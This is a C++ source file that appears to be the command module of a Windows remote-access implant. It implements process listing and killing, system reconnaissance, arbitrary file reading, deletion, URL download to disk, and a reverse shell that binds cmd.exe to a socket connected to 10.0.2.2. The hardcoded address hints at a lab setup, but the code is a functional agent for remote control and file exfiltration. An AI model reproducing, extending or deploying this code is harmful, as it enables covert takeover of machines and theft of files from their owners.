#include "Commands.h"
#include <iostream>
#include <winsock2.h>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <windows.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <filesystem>
#include <fstream>
#include <codecvt>
#include <locale>
#include <strsafe.h>
#include <urlmon.h>
#include "Gdiplus.h"
#include "Crypto.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")

#pragma warning(disable : 4996)

#define BUFSIZE 4096
#define INFO_BUFFER_SIZE 32767

#define COMMAND_ERROR(s, c, r)                                                 \
  r["error"] = s;                                                              \
  c.callback(r);                                                               \
  return

#define COMMAND_SUCCESS(c)                                                     \
  json r;                                                                      \
  r["success"] = true;                                                         \
  c.callback(r);                                                               \
  return

void PingCommand(Command command);
void ExecCommand(Command command);
void ListProcessesCommand(Command command);
void KillCommand(Command command);
void InfoCommand(Command command);
void ReadCommand(Command command);
void ListFilesCommand(Command command);
void UploadFileCommand(Command command);
void DeleteFileCommand(Command command);
void ShellCommand(Command command);

const std::function<void(Command)> commands[] = {
    &PingCommand, &ExecCommand,       &ListProcessesCommand,
    &KillCommand, &InfoCommand,       &ListFilesCommand,
    &ReadCommand, &UploadFileCommand, &DeleteFileCommand,
    &ShellCommand};

using convert_t = std::codecvt_utf8<wchar_t>;
std::wstring_convert<convert_t, wchar_t> strconverter;

std::string to_string(std::wstring wstr) { return strconverter.to_bytes(wstr); }

std::wstring to_wstring(std::string str) {
  return strconverter.from_bytes(str);
}

void runCommand(Command command) {
  std::cout << "Received task: " << command.taskID << std::endl;
  commands[command.commandID](command);
};

void PingCommand(Command command) { COMMAND_SUCCESS(command); }

void ExecCommand(Command command) {
  json result;

  LPTSTR cmdLine = _tcsdup(TEXT("C:\\Windows\\System32\\cmd.exe /c whoami"));

  SECURITY_ATTRIBUTES sa;
  sa.nLength = sizeof(sa);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle = TRUE;

  HANDLE hStdOutRd, hStdOutWr;
  HANDLE hStdErrRd, hStdErrWr;

  if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0))
    COMMAND_ERROR("Failed to create pipe.", command, result);

  if (!CreatePipe(&hStdErrRd, &hStdErrWr, &sa, 0))
    COMMAND_ERROR("Failed to create pipe.", command, result);

  SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
  SetHandleInformation(hStdErrRd, HANDLE_FLAG_INHERIT, 0);

  STARTUPINFO si;
  ZeroMemory(&si, sizeof(STARTUPINFO));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
  si.hStdOutput = hStdOutWr;
  si.hStdError = hStdErrWr;

  PROCESS_INFORMATION pi;
  ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

  BOOL success =
      CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

  if (!success) {
    COMMAND_ERROR("Failed to create child process.", command, result);
  } else {

    DWORD dwReadO, dwReadE;
    CHAR outBuf[BUFSIZE + 1];
    CHAR errBuf[BUFSIZE + 1];
    BOOL bSuccess = FALSE;

    std::string output;

    bSuccess = ReadFile(hStdOutRd, outBuf, BUFSIZE, &dwReadO, NULL);

    // TODO: Stops after exiting?!
    while (bSuccess && dwReadO > 0) {
      outBuf[dwReadO] = '\0';
      output.append(outBuf);
      std::cout << output << std::endl;
      bSuccess = ReadFile(hStdOutRd, outBuf, BUFSIZE, &dwReadO, NULL);
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    result["output"] = output;

    std::cout << result.dump() << std::endl;
  }

  CloseHandle(hStdOutRd);
  CloseHandle(hStdOutWr);
  CloseHandle(hStdErrRd);
  CloseHandle(hStdErrWr);

  command.callback(result);
}

void ListProcessesCommand(Command command) {
  json result;

  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(pe32);

  HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

  if (hProcessSnap == INVALID_HANDLE_VALUE)
    COMMAND_ERROR("CreateToolhelp32Snapshot call failed.", command, result);

  BOOL bMore = Process32First(hProcessSnap, &pe32);

  while (bMore) {
    json pJson;
    pJson["processID"] = pe32.th32ProcessID;
    pJson["name"] = std::filesystem::path(pe32.szExeFile).string();
    result["processes"].push_back(pJson);
    bMore = Process32Next(hProcessSnap, &pe32);
  }

  CloseHandle(hProcessSnap);
  command.callback(result);
}

void KillCommand(Command command) {
  int pid = command.args["processID"].get<int>();
  const auto proc = OpenProcess(PROCESS_TERMINATE, false, pid);
  TerminateProcess(proc, 1);
  CloseHandle(proc);
  COMMAND_SUCCESS(command);
}

void InfoCommand(Command command) {
  json result;

  char buffer[260] = {0};
  DWORD size = sizeof(buffer);

  GetComputerNameA(buffer, &size);
  result["hostname"] = std::string(buffer);

  GetUserNameA(buffer, &size);
  result["username"] = std::string(buffer);

  OSVERSIONINFOEX osvInfo = {0};
  osvInfo.dwOSVersionInfoSize = sizeof(osvInfo);

  GetVersionEx((OSVERSIONINFO *)&osvInfo);

  result["os"]["version"] =
      std::format("{}.{}", osvInfo.dwMajorVersion, osvInfo.dwMinorVersion);
  result["os"]["build"] = std::format("{}", osvInfo.dwBuildNumber);

  switch (osvInfo.wProductType) {
  case VER_NT_WORKSTATION:
    result["os"]["product_type"] = "Workstation";
    break;

  case VER_NT_SERVER:
    result["os"]["product_type"] = "Server";
    break;

  case VER_NT_DOMAIN_CONTROLLER:
    result["os"]["product_type"] = "Domain Controller";
    break;
  }

  GetModuleFileNameA(NULL, buffer, MAX_PATH);
  std::string::size_type pos = std::string(buffer).find_last_of("\\/");
  result["current_dir"] = std::string(buffer);

  command.callback(result);
}

void ReadCommand(Command command) {
  json result;
  std::string path = command.args["path"].get<std::string>();

  auto ss = std::ostringstream{};
  std::ifstream input_file(path);
  if (!input_file.is_open())
    COMMAND_ERROR("Could not open the file.", command, result);
  ss << input_file.rdbuf();
  result["contents"] = ss.str();
  command.callback(result);
}

void ListFilesCommand(Command command) {
  HANDLE dir;
  WIN32_FIND_DATA file_data;

  json result;

  WIN32_FIND_DATA ffd;
  LARGE_INTEGER filesize;
  TCHAR szDir[MAX_PATH];
  size_t length_of_arg;
  HANDLE hFind = INVALID_HANDLE_VALUE;
  DWORD dwError = 0;

  StringCchCopy(szDir, MAX_PATH,
                command.args["path"].get<std::string>().c_str());
  StringCchCat(szDir, MAX_PATH, TEXT("\\*"));

  hFind = FindFirstFile(szDir, &ffd);

  if (INVALID_HANDLE_VALUE == hFind)
    COMMAND_ERROR("Not found.", command, result);

  do {
    if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
      result["contents"]["dirs"].push_back(ffd.cFileName);
    } else {
      filesize.LowPart = ffd.nFileSizeLow;
      filesize.HighPart = ffd.nFileSizeHigh;
      result["contents"]["files"].push_back(ffd.cFileName);
    }
  } while (FindNextFileA(hFind, &ffd) != 0);

  FindClose(hFind);

  command.callback(result);
}

void UploadFileCommand(Command command) {
  json result;

  std::string url = command.args["url"].get<std::string>();
  std::string filePath = command.args["path"].get<std::string>();

  HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), filePath.c_str(), 0, NULL);

  if (SUCCEEDED(hr))
    COMMAND_SUCCESS(command);
  else
    COMMAND_ERROR("Failed to download.", command, result);
}

void DeleteFileCommand(Command command) {
  json result;
  std::string path = command.args["path"].get<std::string>();
  auto res = DeleteFileA(path.c_str());
  if (res)
    COMMAND_SUCCESS(command);
  else
    COMMAND_ERROR("An error occurred.", command, result);
}

void ShellCommand(Command command) {
  const char *ip = "10.0.2.2";
  int port = command.args["port"].get<int>();

  WSADATA wsaData;
  SOCKET wSock;
  struct sockaddr_in hax;
  STARTUPINFO sui;
  PROCESS_INFORMATION pi;

  WSAStartup(MAKEWORD(2, 2), &wsaData);

  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL,
                    (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  WSAConnect(wSock, (SOCKADDR *)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

  CreateProcess(NULL, (LPSTR) "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui,
                &pi);
  COMMAND_SUCCESS(command);
}
